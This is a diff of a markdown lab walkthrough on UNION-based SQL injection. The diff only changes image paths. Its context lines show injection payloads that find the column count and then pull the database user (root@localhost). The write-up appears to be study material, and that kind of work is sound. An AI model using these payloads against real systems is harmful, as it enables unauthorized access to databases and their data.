@@ -120,7 +120,7 @@ As we can see, we can get the database version displayed. Now we know how to for
 
 # Question
 ---
-![](../images/Pasted%20image%2020250131172016.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250131172016.png)
 
 
 Let's begin by testing with the following query:
@@ -129,25 +129,25 @@ Let's begin by testing with the following query:
 
 This outputs the following:
 
-![](../images/Pasted%20image%2020250131172255.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250131172255.png)
 
 So, we need to keep adding more:
 
 `xx' union select 1,2-- -`
 
-![](../images/Pasted%20image%2020250131172334.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250131172334.png)
 
 We need more:
 
 `xx' union select 1,2,3-- -`
 
-![](../images/Pasted%20image%2020250131172400.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250131172400.png)
 
 More:
 
 `xx' union select 1,2,3,4-- -`
 
-![](../images/Pasted%20image%2020250131172430.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250131172430.png)
 
 Found it!
 
@@ -155,7 +155,7 @@ We can submit the following in order to get the contents of `user()`:
 
 `xx' union select 1,user(),3,4-- -`
 
-![](../images/Pasted%20image%2020250131172528.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250131172528.png)
 
 Got it: `root@localhost`
 
